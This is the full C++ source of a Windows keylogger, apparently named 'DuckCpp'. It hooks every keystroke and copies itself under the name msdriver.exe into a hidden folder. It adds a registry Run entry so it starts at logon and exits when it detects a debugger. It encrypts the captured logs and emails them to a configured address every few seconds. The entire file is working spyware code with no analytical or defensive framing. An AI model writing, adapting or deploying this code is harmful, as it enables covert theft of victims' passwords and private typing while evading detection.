#define WIN32_LEAN_AND_MEAN

#pragma comment(lib, "ws2_32.lib")  //WinSocks2
#pragma comment(lib, "wldap32.lib")
#pragma comment(lib, "Crypt32.lib")

#include <string>
#include <fstream>
#include <sstream>
#include <vector>

#include <windows.h>
#include <WinBase.h>
#include <tchar.h>

#include "curl/include/curl/curl.h"
#include "AES/AES.h"

typedef std::basic_string<TCHAR, std::char_traits<TCHAR>, std::allocator<TCHAR> > tstring;
using std::string;
using std::vector;
enum class WorkMode {
	sendLogEmail,
	writeLogFile
};

//Settings
tstring executableFileName(_T("msdriver.exe"));
tstring logFileName(_T("bin"));
tstring dirPath(_T("c:\\driver"));
bool	copyToAutorun = true;
int		timerPeriodSeconds = 10;

//Mail settings
bool trySendEmail = true;
string login = "sender@example.com";
string password = "password";
string URL = "smtp://smtp.example.com:587";
string repicient = "repicient@example.com";

//Encryption settings
bool encryptLogs = true;
string aesKey = "cdf851f8efcc9c58c980642ecb43665c1b3779754e22462c0bf63cd66429cdc9";

//Global variables
string keyLog;
HANDLE logFileHandle;
MSG msg;
string header = "To: " + repicient + "\r\n" +
"From: " + login + " (DuckCpp log sender)\r\n" +
"Subject: Log\r\n\r\n";
WorkMode mode = trySendEmail ? WorkMode::sendLogEmail : WorkMode::writeLogFile;
struct curl_slist* recipients = NULL;
vector<unsigned char> key;
AES aes(256);

//Function prototypes
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
VOID CALLBACK TimerCallback(HWND, UINT, UINT idTimer, DWORD dwTime);
static size_t readfunc(void* ptr, size_t size, size_t nmemb, void* userp);
void processLog();
bool sendMail();
void checkDebugging();
vector<unsigned char> hexToBytes(const string& hex);
inline char hexDigit(unsigned a);
string bytesToHex(unsigned char* data, int length);
void createDirectoryRecursively(tstring path);

//Main
int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
{
	keyLog.reserve(256);
	if(trySendEmail)
		recipients = curl_slist_append(recipients, repicient.c_str());
	checkDebugging();

	//Init encryption
	if (encryptLogs)
		key = hexToBytes(aesKey);

	//Create directory for log
	createDirectoryRecursively(dirPath);

	//Copy to autorun
	if (copyToAutorun) {
		TCHAR szFileName[MAX_PATH];
		GetModuleFileName(NULL, szFileName, MAX_PATH); //Get current instance's executable file path
		tstring fileCopyPath = dirPath + _T("\\") + executableFileName;	//Get final path
		CopyFile(szFileName, fileCopyPath.c_str(), TRUE); //Copy executable file
		//Set registry autorun key
		HKEY hKey = NULL;
		LONG result = RegOpenKey(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey);
		RegSetValueEx(hKey, _T("Autorun"), 0, REG_SZ, (PBYTE)fileCopyPath.c_str(), fileCopyPath.size() * sizeof(TCHAR) + 1);
		RegCloseKey(hKey);
	}

	//Create timer
	SetTimer(NULL, 1, timerPeriodSeconds * 1000, (TIMERPROC)TimerCallback);

	//Create or open log file
	tstring logPath = dirPath + _T("\\") + logFileName;
	logFileHandle = CreateFile(logPath.c_str(),
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE | FILE_SHARE_READ,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		0);
	SetFilePointer(logFileHandle, 0, NULL, FILE_END); //Write to end of file

	//WM_KEYBOARD_LL hook
	SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);

	//Main cycle
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	KillTimer(NULL, 1); //Destroy timer
	processLog(); //Last log processing
	curl_slist_free_all(recipients);
	CloseHandle(logFileHandle); //Close file handle
	return 0;
}

//Keyboard event
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HC_ACTION && wParam == WM_KEYDOWN)
	{
		//Time
		char timeBuf[10];
		SYSTEMTIME st;
		GetLocalTime(&st);
		sprintf_s(timeBuf, "%.2u:%.2u:%.2u ", st.wHour, st.wMinute, st.wSecond);
		string line(timeBuf);

		//Virtual key code
		DWORD vkCode = (((LPKBDLLHOOKSTRUCT)lParam)->vkCode);

		//Modifiers
		if (vkCode != VK_SHIFT && GetAsyncKeyState(VK_SHIFT)) line += "SHIFT + ";
		if (vkCode != VK_CONTROL && GetAsyncKeyState(VK_CONTROL)) line += "CTRL + ";
		if (vkCode != VK_MENU && GetAsyncKeyState(VK_MENU)) line += "ALT + ";

		char keyName[20];
		GetKeyNameTextA(MapVirtualKeyA(vkCode, NULL) << 16, keyName, 20);
		line.append(keyName);

		keyLog += line + "\n";
		line.clear();
	}
	return 0;
}

//Timer elapsed
VOID CALLBACK TimerCallback(HWND, UINT, UINT idTimer, DWORD dwTime)
{
	processLog();
}

void processLog()
{
	checkDebugging();
	if (keyLog.empty())
		return;
	if (encryptLogs)
	{
		vector<unsigned char> input(keyLog.begin(), keyLog.end());
		unsigned int encryptedLength;
		unsigned char* encrypted = aes.EncryptECB(&input[0], keyLog.size(), &key[0], encryptedLength);
		keyLog = bytesToHex(encrypted, encryptedLength) + "\nENDBLOCK\n";
	}
	if (mode == WorkMode::sendLogEmail)
	{
		if (!sendMail())
			mode = WorkMode::writeLogFile; //Fail sending mail; will write to file
	}
	if (mode == WorkMode::writeLogFile)
	{
		DWORD numberOfBytesWritten;
		WriteFile(logFileHandle, keyLog.c_str(), keyLog.length(), &numberOfBytesWritten, NULL);
	}
	keyLog.clear();
}

static size_t readfunc(void* ptr, size_t size, size_t nmemb, void* userp)
{
	static int callNumber = 0; //Call number counter, 0 - header, 1 - body, 2 - send mail

	struct upload_status {
		int lines_read;
	} *upload_ctx = (upload_status*)userp;

	if ((size == 0) || (nmemb == 0) || ((size * nmemb) < 1))
		return 0;

	string& data = (callNumber == 0 ? header : keyLog);

	if (++callNumber == 3) {
		callNumber = 0;
		return 0;
	}

	memcpy(ptr, data.c_str(), data.length());
	upload_ctx->lines_read++;
	return data.length();
}

bool sendMail()
{
	if (CURL* curl = curl_easy_init()) {
		curl_easy_setopt(curl, CURLOPT_USERNAME, login.c_str());
		curl_easy_setopt(curl, CURLOPT_PASSWORD, password.c_str());
		curl_easy_setopt(curl, CURLOPT_URL, URL.c_str());
		curl_easy_setopt(curl, CURLOPT_MAIL_FROM, login.c_str());
		curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
		curl_easy_setopt(curl, CURLOPT_READFUNCTION, readfunc);
		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

		CURLcode res = curl_easy_perform(curl);

		curl_easy_cleanup(curl);

		return res == CURLE_OK;
	}
	else return false;
}

void checkDebugging()
{
	BOOL dbgPresent = FALSE;
	CheckRemoteDebuggerPresent(GetCurrentProcess(), &dbgPresent); //Anti-debug using NtQueryInformationProcess

	CONTEXT context = {};
	context.ContextFlags = CONTEXT_DEBUG_REGISTERS; //Check debug registers
	GetThreadContext(GetCurrentThread(), &context);

	if (IsDebuggerPresent() || dbgPresent || context.Dr0 != 0 || context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3 != 0)
		exit(0);
}

vector<unsigned char> hexToBytes(const string& hex)
{
	vector<unsigned char> bytes(hex.size() / 2);
	for (unsigned int i = 0; i < bytes.size(); ++i)
		bytes[i] = (unsigned char)strtol(hex.substr(2 * i, 2).c_str(), NULL, 16);
	return bytes;
}

inline char hexDigit(unsigned a)
{
	return a + (a < 10 ? '0' : 'a' - 10);
}

string bytesToHex(unsigned char * data, int length)
{
	string r(length * 2, '\0');
	for (int i = 0; i < length; ++i) {
		r[i * 2] = hexDigit(data[i] >> 4);
		r[i * 2 + 1] = hexDigit(data[i] & 15);
	}
	return r;
}

void createDirectoryRecursively(tstring path)
{
	BOOL directoryCreated = CreateDirectory(path.c_str(), NULL);
	if (!directoryCreated)
	{
		if (GetLastError() == ERROR_PATH_NOT_FOUND)
		{
			size_t newSize = path.find_last_of(_T('\\'));
			if (newSize == tstring::npos)
				abort();
			tstring newPath(path.begin(), path.begin() + newSize);
			createDirectoryRecursively(newPath);
			CreateDirectory(path.c_str(), NULL);
		}
	}
	SetFileAttributes(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
}